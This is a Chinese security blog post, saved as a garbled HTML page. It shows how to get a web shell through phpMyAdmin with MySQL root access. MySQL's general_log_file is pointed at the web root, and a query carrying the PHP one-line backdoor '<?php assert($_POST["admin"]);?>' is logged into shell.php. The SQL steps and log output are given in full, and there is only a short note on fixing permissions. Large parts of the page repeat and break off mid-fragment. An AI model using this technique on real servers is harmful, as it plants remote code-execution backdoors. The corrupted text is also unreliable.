<!DOCTYPE html>
<html>

  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>phpMyAdmin新姿势getshell « 倾旋的博客</title>
  <meta name="description" content="假设我们拥有MySQL的root权限，登录Web端的phpMyAdmin数据库管理控制台，你有多少种方法去getshell？">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://payloads.online/archivers/2017-03-05/1">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">倾旋的博客</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">About</a>
      
        
        <a class="page-link" href="/posts/">Posts</a>
      
        
        <a class="page-link" href="/links/">Links</a>
      
        
        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
      
        
        <a class="page-link" href="/feed.xml">RSS</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="post">

  <header class="post-header">
    <h1 class="post-title">phpMyAdmin新姿势getshell</h1>
    <p class="post-meta">Mar 23, 2017</p>
  </header>

  <article class="post-content">
    <p>假设我们拥有MySQL的root权限，登录Web端的phpMyAdmin数据库管理控制台，你有多少种方法去getshell？
<!--more--></p>

<ul id="markdown-toc">
  <li><a href="#0x00-%E8%AE%BE%E6%83%B3" id="markdown-toc-0x00-设想">0x00 设想</a></li>
  <li><a href="#0x01-%E5%B8%B8%E8%A7%84%E6%96%B9%E6%B3%95%E6%B5%8B%E8%AF%95" id="markdown-toc-0x01-常规方法测试">0x01 常规方法测试</a></li>
  <li><a href="#0x00-%E8%AE%BE%E6%83%B3-1" id="markdown-toc-0x00-设想-1">0x00 设想</a></li>
  <li><a href="#0x01-%E5%B8%B8%E8%A7%84%E6%96%B9%E6%B3%95%E6%B5%8B%E8%AF%95-1" id="markdown-toc-0x01-常规方法测试-1">0x01 常规方法测试</a></li>
  <li><a href="#0x02-%E6%96%B0%E5%A7%BF%E5%8A%BF%E6%B5%8B%E8%AF%95" id="markdown-toc-0x02-新姿势测试">0x02 新姿势测试</a></li>
  <li><a href="#0x03-%E6%80%BB%E7%BB%93" id="markdown-toc-0x03-总结">0x03 总结</a></li>
  <li><a href="#0x03-%E6%80%BB%E7%BB%93-1" id="markdown-toc-0x03-总结-1">0x03 总结</a></li>
  <li><a href="#0x03-%E6%80%BB%E7%BB%93-2" id="markdown-toc-0x03-总结-2">0x03 总结</a></li>
  <li><a href="#0x03-%E6%80%BB%E7%BB%93-3" id="markdown-toc-0x03-总结-3">0x03 总结</a></li>
  <li><a href="#0x03-%E6%80%BB%E7%BB%93-4" id="markdown-toc-0x03-总结-4">0x03 总结</a></li>
  <li><a href="#0x03-%E6%80%BB%E7%BB%93-5" id="markdown-toc-0x03-总结-5">0x03 总结</a></li>
  <li><a href="#0x03-%E6%80%BB%E7%BB%93-6" id="markdown-toc-0x03-总结-6">0x03 总结</a></li>
  <li><a href="#0x03-%E6%80%BB%E7%BB%93-7" id="markdown-toc-0x03-总结-7">0x03 总结</a></li>
  <li><a href="#0x03-%E6%80%BB%E7%BB%93-8" id="markdown-toc-0x03-总结-8">0x03 总结</a></li>
</ul>

<h2 id="0x00-设想">0x00 设想</h2>

<p>假设我们拥有MySQL的root权限，登录Web端的phpMyAdmin数据库管理控制台，你有多少种方法去getshell？</p>

<p>本文旨在研究新的方法，如果在INTO OUTFILE禁用的情况下，或许会少很多思路了。</p>

<p>这里的禁用是完全（权限）禁用，而不是拦截行为。</p>

<h2 id="0x01-常规方法测试">0x01 常规方法测试</h2>

<p>好了，入正题，我目前拥有一台WIN XP虚拟机，上面的服务如下：</p>

<ul>
  <li>Apache 2.4.23（此环境与本文实现的攻击关系不大）</li>
  <li>PHP 5.4.45（此环境与本文实现的攻击关系不大）</li>
  <li>phpMyAdmin 4.6.6（此环境与本文实现的攻击关系不大）</li>
  <li>MySQL 5.5.53 - MySQL Community Server (GPL) （5.0以上）</li>
  <li>
    <p>绝对路径：`C:\phpStu\WWW假设我们拥有MySQL的root权限，登录Web端的phpMyAdmin数据库管理控制台，你有多少种方法去getshell？
<!--more--></p>
  </li>
  <li>目录</li>
</ul>

<h2 id="0x00-设想-1">0x00 设想</h2>

<p>假设我们拥有MySQL的root权限，登录Web端的phpMyAdmin数据库管理控制台，你有多少种方法去getshell？</p>

<p>本文旨在研究新的方法，如果在INTO OUTFILE禁用的情况下，或许会少很多思路了。</p>

<p>这里的禁用是完全（权限）禁用，而不是拦截行为。</p>

<h2 id="0x01-常规方法测试-1">0x01 常规方法测试</h2>

<p>好了，入正题，我目前拥有一台WIN XP虚拟机，上面的服务如下：</p>

<ul>
  <li>Apache 2.4.23（此环境与本文实现的攻击关系不大）</li>
  <li>PHP 5.4.45（此环境与本文实现的攻击关系不大）</li>
  <li>phpMyAdmin 4.6.6（此环境与本文实现的攻击关系不大）</li>
  <li>MySQL 5.5.53 - MySQL Community Server (GPL) （5.0以上）</li>
  <li>绝对路径：</li>
</ul>

<p>目前大部分站点都使用了MySQL 5.0以上的版本</p>

<p>我们先尝试一下使用SQL表达式INTO OUTFILE 去getshell：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-92a62b6bce5a6c66aa07dcae86a45b2e_r.jpg" alt="enter description here"></p>

<p>可以看到已经被阻止了 ，具体原因我们在这里讲一下：</p>

<p>错误提示</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement.
</code></pre></div></div>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-103d1faf4ef1790dda328ae855828eb0_hd.jpg" alt="enter description here"></p>

<p>secure-file-priv这个全局变量是指定文件夹作为导出文件存放的地方，默认情况下，secure-file-priv是一个空值（NULL）。我们现在设置为网站的根目录，再去尝试使用INTO OUTFILE getshell。</p>

<p>但是在我们使用SQL修改的时候，发现这个值是只读的。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-6120a906737c3c20d87cd3ae4c0f3db5_r.jpg" alt="enter description here"></p>

<p>经过查阅资料知道，这个值只能通过修改MySQL的配置文件来达到修改的目的。</p>

<h2 id="0x02-新姿势测试">0x02 新姿势测试</h2>

<p>这些希望破灭以后我并没有沮丧，我相信这些研究都是有用的，有助于我的思考。</p>

<p>于是把目光转向了MySQL的特性，开始测试MySQL全局变量对MySQL本身的影响。</p>

<p>最后我发现MySQL 5.0+的版本会自动创建日志文件，那么在服务运行的情况下修改全局变量也是可以变动文件位置的，但是必须要对生成日志的目录有可读可写的权限。（Linux环境下可能会比较苛刻，因为站点目录是一个用户，MySQL是另外一个用户，权限管控较为严格，主要取决于权限配置是否得当）</p>

<p>OK，不废话，开始测试~~</p>

<p>首先呢，介绍两个MySQL全局变量（general_log、general_log file）</p>

<ul>
  <li>general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。</li>
  <li>general log file 指的是日志的保存路径。</li>
</ul>

<p>我们先查看一下全局变量 ~</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-7937fe1a956ff7ef604a1b6a8d0b803d_r.jpg" alt="enter description here"></p>

<p>目前是OFF状态，也就是不保存SQL到日志文件中。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-c9c5b6ab51e7f8f55eaac27d3529f189_r.jpg" alt="enter description here"></p>

<p>这里强调一下保存过程，general_log是保存每一条你执行的SQL到文件中。目前为OFF，所以文件还没有被创建，我们修改为ON尝试让MySQL创建文件：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-905b73ccaab7b944d18b92816250c10d_hd.jpg" alt="enter description here"></p>

<p>我们去主机上的目录里看看这个文件是否存在：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-edf0809c6bd914d9127e220060f60395_r.jpg" alt="enter description here"></p>

<p>贴出文件内容：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\phpStu\mysql/bin/mysqld.exe, Version: 5.5.53 (MySQL Community Server (GPL)). started with:
TCP Port: 3306, Named Pipe: MySQL
Time                 Id Command    Argument
170323 18\:08\:54	   35 Quit
</code></pre></div></div>

<p>目前是没有什么内容的。我们在控制台随便执行一个SQL：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT MD5('admin');
</code></pre></div></div>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-e8be82b148faa920ceda19d592820470_hd.jpg" alt="enter description here"></p>

<p>贴出新的日志内容：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">phpStu</span><span class="err">\</span><span class="n">mysql</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">mysqld</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span> <span class="k">Version</span><span class="p">:</span> <span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">53</span> <span class="p">(</span><span class="n">MySQL</span> <span class="n">Community</span> <span class="n">Server</span> <span class="p">(</span><span class="n">GPL</span><span class="p">)).</span> <span class="n">started</span> <span class="k">with</span><span class="p">:</span>
<span class="n">TCP</span> <span class="n">Port</span><span class="p">:</span> <span class="mi">3306</span><span class="p">,</span> <span class="n">Named</span> <span class="n">Pipe</span><span class="p">:</span> <span class="n">MySQL</span>
<span class="nb">Time</span>                 <span class="n">Id</span> <span class="n">Command</span>    <span class="n">Argument</span>
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">54</span>	   <span class="mi">35</span> <span class="n">Quit</span>	
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">55</span>	   <span class="mi">36</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">36</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">36</span> <span class="n">Init</span> <span class="n">DB</span>	<span class="n">mysql</span>
		   <span class="mi">36</span> <span class="n">Query</span>	<span class="k">SHOW</span> <span class="n">MASTER</span> <span class="n">LOGS</span>
		   <span class="mi">36</span> <span class="n">Quit</span>	
		   <span class="mi">37</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">37</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">37</span> <span class="n">Quit</span>	
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">21</span>	   <span class="mi">38</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">38</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">38</span> <span class="n">Query</span>	<span class="k">SELECT</span> <span class="n">MD5</span><span class="p">(</span><span class="s1">'admin'</span><span class="p">)</span>
		   <span class="mi">38</span> <span class="n">Quit</span>

</code></pre></div></div>
<p>可以清除的发现，日志文件同步保存了我们所有的SQL语句……猥琐的思路从脑海中喷发而出~ 我们要在站点目录下使用MySQL的日志功能创建一个shell.php</p>

<p>首先查看目录中不存在shell.php这个文件：
<img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-f7cdabc60f3f39b2ca25a3f486bb23b4_r.jpg" alt="enter description here"></p>

<p>（确保general_log 的值已经为ON，前面已经设置过了）然后设置general_log_file的值为我们一句话木马的绝对路径：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SET</span> <span class="k">global</span> <span class="n">general_log_file</span><span class="o">=</span><span class="s1">'C:/phpStu/WWW/shell.php'</span><span class="p">;</span>
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-66414717c8f4be26b9af449ab2634c06_r.jpg" alt="enter description here"></p>

<p>我们再去看看站点下是否创建了这个文件：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-e8273a7d3fdc1fbb990d8f911d17b5b9_r.jpg" alt="enter description here"></p>

<p>创建成功，并且文件内容中也有日志的初始值。</p>

<p>我们现在写入一句话~ 强调一下，SQL就是SQL，在保存到日志中的时候不会解析转译符号，不知道大家能否理解，我举一个例子：</p>

<p>我们查询：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT '&lt;?php assert($_POST[

保存到日志中也会变成

</code></pre></div></div>
<p>SELECT ‘&lt;?php assert($_POST[
php这边解析的时候就会报错，因此我们采用单引号与双引号公用的方式实现：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT '&lt;?php assert($_POST["admin"]);?&gt;';
PS：$_POST中不用引号也可以~
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-0ae649932588d176756a432479ff62cf_r.jpg" alt="enter description here"></p>

<p>我们访问看看~</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-e5cc5693f6a7e55616cdfa62f605bddc_hd.jpg" alt="enter description here"></p>

<p>已经解析php了，我们同样测试一下是否能执行php代码吧 ~</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-b13043cfb90de8ac7a55aec067901aad_hd.jpg" alt="enter description here"></p>

<p>贴出日志内容：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">phpStu</span><span class="err">\</span><span class="n">mysql</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">mysqld</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span> <span class="k">Version</span><span class="p">:</span> <span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">53</span> <span class="p">(</span><span class="n">MySQL</span> <span class="n">Community</span> <span class="n">Server</span> <span class="p">(</span><span class="n">GPL</span><span class="p">)).</span> <span class="n">started</span> <span class="k">with</span><span class="p">:</span>
<span class="n">TCP</span> <span class="n">Port</span><span class="p">:</span> <span class="mi">3306</span><span class="p">,</span> <span class="n">Named</span> <span class="n">Pipe</span><span class="p">:</span> <span class="n">MySQL</span>
<span class="nb">Time</span>                 <span class="n">Id</span> <span class="n">Command</span>    <span class="n">Argument</span>
		   <span class="mi">44</span> <span class="n">Quit</span>	
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">27</span>	   <span class="mi">45</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">45</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">45</span> <span class="n">Init</span> <span class="n">DB</span>	<span class="n">mysql</span>
		   <span class="mi">45</span> <span class="n">Query</span>	<span class="k">SHOW</span> <span class="n">MASTER</span> <span class="n">LOGS</span>
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">28</span>	   <span class="mi">45</span> <span class="n">Quit</span>	
		   <span class="mi">46</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">46</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">46</span> <span class="n">Quit</span>	
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">01</span>	   <span class="mi">47</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">47</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">47</span> <span class="n">Query</span>	<span class="k">SELECT</span> <span class="s1">'&lt;?php assert($_POST["admin"]);?&gt;'</span>
		   <span class="mi">47</span> <span class="n">Quit</span>	
</code></pre></div></div>

<h2 id="0x03-总结">0x03 总结</h2>

<p>在权限把控不严谨的情况下容易出现此类攻击，如果MySQL没有权限在站点根目录下创建文件的话也就不会发生这样的情况了。</p>

<p>修复方案就是权限把控好就可以了 ~
admin
php这边解析的时候就会报错，因此我们采用单引号与双引号公用的方式实现：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT '&lt;?php assert($_POST["admin"]);?&gt;';
PS：$_POST中不用引号也可以~
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-0ae649932588d176756a432479ff62cf_r.jpg" alt="enter description here"></p>

<p>我们访问看看~</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-e5cc5693f6a7e55616cdfa62f605bddc_hd.jpg" alt="enter description here"></p>

<p>已经解析php了，我们同样测试一下是否能执行php代码吧 ~</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-b13043cfb90de8ac7a55aec067901aad_hd.jpg" alt="enter description here"></p>

<p>贴出日志内容：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">phpStu</span><span class="err">\</span><span class="n">mysql</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">mysqld</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span> <span class="k">Version</span><span class="p">:</span> <span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">53</span> <span class="p">(</span><span class="n">MySQL</span> <span class="n">Community</span> <span class="n">Server</span> <span class="p">(</span><span class="n">GPL</span><span class="p">)).</span> <span class="n">started</span> <span class="k">with</span><span class="p">:</span>
<span class="n">TCP</span> <span class="n">Port</span><span class="p">:</span> <span class="mi">3306</span><span class="p">,</span> <span class="n">Named</span> <span class="n">Pipe</span><span class="p">:</span> <span class="n">MySQL</span>
<span class="nb">Time</span>                 <span class="n">Id</span> <span class="n">Command</span>    <span class="n">Argument</span>
		   <span class="mi">44</span> <span class="n">Quit</span>	
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">27</span>	   <span class="mi">45</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">45</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">45</span> <span class="n">Init</span> <span class="n">DB</span>	<span class="n">mysql</span>
		   <span class="mi">45</span> <span class="n">Query</span>	<span class="k">SHOW</span> <span class="n">MASTER</span> <span class="n">LOGS</span>
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">28</span>	   <span class="mi">45</span> <span class="n">Quit</span>	
		   <span class="mi">46</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">46</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">46</span> <span class="n">Quit</span>	
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">01</span>	   <span class="mi">47</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">47</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">47</span> <span class="n">Query</span>	<span class="k">SELECT</span> <span class="s1">'&lt;?php assert($_POST["admin"]);?&gt;'</span>
		   <span class="mi">47</span> <span class="n">Quit</span>	
</code></pre></div></div>

<h2 id="0x03-总结-1">0x03 总结</h2>

<p>在权限把控不严谨的情况下容易出现此类攻击，如果MySQL没有权限在站点根目录下创建文件的话也就不会发生这样的情况了。</p>

<p>修复方案就是权限把控好就可以了 ~
]);?&gt;’;</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php这边解析的时候就会报错，因此我们采用单引号与双引号公用的方式实现：

</code></pre></div></div>
<p>SELECT ‘&lt;?php assert($_POST[“admin”]);?&gt;’;
PS：$_POST中不用引号也可以~</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
![enter description here](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-0ae649932588d176756a432479ff62cf_r.jpg)

我们访问看看~

![enter description here](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-e5cc5693f6a7e55616cdfa62f605bddc_hd.jpg)

已经解析php了，我们同样测试一下是否能执行php代码吧 ~

![enter description here](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-b13043cfb90de8ac7a55aec067901aad_hd.jpg)

贴出日志内容：

```sql
C:\phpStu\mysql/bin/mysqld.exe, Version: 5.5.53 (MySQL Community Server (GPL)). started with:
TCP Port: 3306, Named Pipe: MySQL
Time                 Id Command    Argument
		   44 Quit	
170323 18\:27\:27	   45 Connect	root@localhost on 
		   45 Query	SET NAMES 'utf8' COLLATE 'utf8_general_ci'
		   45 Init DB	mysql
		   45 Query	SHOW MASTER LOGS
170323 18\:27\:28	   45 Quit	
		   46 Connect	root@localhost on 
		   46 Query	SET NAMES 'utf8' COLLATE 'utf8_general_ci'
		   46 Quit	
170323 18\:28\:01	   47 Connect	root@localhost on 
		   47 Query	SET NAMES 'utf8' COLLATE 'utf8_general_ci'
		   47 Query	SELECT '&lt;?php assert($_POST["admin"]);?&gt;'
		   47 Quit	
</code></pre></div></div>

<h2 id="0x03-总结-2">0x03 总结</h2>

<p>在权限把控不严谨的情况下容易出现此类攻击，如果MySQL没有权限在站点根目录下创建文件的话也就不会发生这样的情况了。</p>

<p>修复方案就是权限把控好就可以了 ~
admin</p>

<p>保存到日志中也会变成</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT '&lt;?php assert($_POST[
php这边解析的时候就会报错，因此我们采用单引号与双引号公用的方式实现：

</code></pre></div></div>
<p>SELECT ‘&lt;?php assert($_POST[“admin”]);?&gt;’;
PS：$_POST中不用引号也可以~</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
![enter description here](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-0ae649932588d176756a432479ff62cf_r.jpg)

我们访问看看~

![enter description here](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-e5cc5693f6a7e55616cdfa62f605bddc_hd.jpg)

已经解析php了，我们同样测试一下是否能执行php代码吧 ~

![enter description here](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-b13043cfb90de8ac7a55aec067901aad_hd.jpg)

贴出日志内容：

```sql
C:\phpStu\mysql/bin/mysqld.exe, Version: 5.5.53 (MySQL Community Server (GPL)). started with:
TCP Port: 3306, Named Pipe: MySQL
Time                 Id Command    Argument
		   44 Quit	
170323 18\:27\:27	   45 Connect	root@localhost on 
		   45 Query	SET NAMES 'utf8' COLLATE 'utf8_general_ci'
		   45 Init DB	mysql
		   45 Query	SHOW MASTER LOGS
170323 18\:27\:28	   45 Quit	
		   46 Connect	root@localhost on 
		   46 Query	SET NAMES 'utf8' COLLATE 'utf8_general_ci'
		   46 Quit	
170323 18\:28\:01	   47 Connect	root@localhost on 
		   47 Query	SET NAMES 'utf8' COLLATE 'utf8_general_ci'
		   47 Query	SELECT '&lt;?php assert($_POST["admin"]);?&gt;'
		   47 Quit	
</code></pre></div></div>

<h2 id="0x03-总结-3">0x03 总结</h2>

<p>在权限把控不严谨的情况下容易出现此类攻击，如果MySQL没有权限在站点根目录下创建文件的话也就不会发生这样的情况了。</p>

<p>修复方案就是权限把控好就可以了 ~
admin
php这边解析的时候就会报错，因此我们采用单引号与双引号公用的方式实现：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT '&lt;?php assert($_POST["admin"]);?&gt;';
PS：$_POST中不用引号也可以~
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-0ae649932588d176756a432479ff62cf_r.jpg" alt="enter description here"></p>

<p>我们访问看看~</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-e5cc5693f6a7e55616cdfa62f605bddc_hd.jpg" alt="enter description here"></p>

<p>已经解析php了，我们同样测试一下是否能执行php代码吧 ~</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-b13043cfb90de8ac7a55aec067901aad_hd.jpg" alt="enter description here"></p>

<p>贴出日志内容：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">phpStu</span><span class="err">\</span><span class="n">mysql</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">mysqld</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span> <span class="k">Version</span><span class="p">:</span> <span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">53</span> <span class="p">(</span><span class="n">MySQL</span> <span class="n">Community</span> <span class="n">Server</span> <span class="p">(</span><span class="n">GPL</span><span class="p">)).</span> <span class="n">started</span> <span class="k">with</span><span class="p">:</span>
<span class="n">TCP</span> <span class="n">Port</span><span class="p">:</span> <span class="mi">3306</span><span class="p">,</span> <span class="n">Named</span> <span class="n">Pipe</span><span class="p">:</span> <span class="n">MySQL</span>
<span class="nb">Time</span>                 <span class="n">Id</span> <span class="n">Command</span>    <span class="n">Argument</span>
		   <span class="mi">44</span> <span class="n">Quit</span>	
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">27</span>	   <span class="mi">45</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">45</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">45</span> <span class="n">Init</span> <span class="n">DB</span>	<span class="n">mysql</span>
		   <span class="mi">45</span> <span class="n">Query</span>	<span class="k">SHOW</span> <span class="n">MASTER</span> <span class="n">LOGS</span>
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">28</span>	   <span class="mi">45</span> <span class="n">Quit</span>	
		   <span class="mi">46</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">46</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">46</span> <span class="n">Quit</span>	
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">01</span>	   <span class="mi">47</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">47</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">47</span> <span class="n">Query</span>	<span class="k">SELECT</span> <span class="s1">'&lt;?php assert($_POST["admin"]);?&gt;'</span>
		   <span class="mi">47</span> <span class="n">Quit</span>	
</code></pre></div></div>

<h2 id="0x03-总结-4">0x03 总结</h2>

<p>在权限把控不严谨的情况下容易出现此类攻击，如果MySQL没有权限在站点根目录下创建文件的话也就不会发生这样的情况了。</p>

<p>修复方案就是权限把控好就可以了 ~
]);?&gt;’;</p>
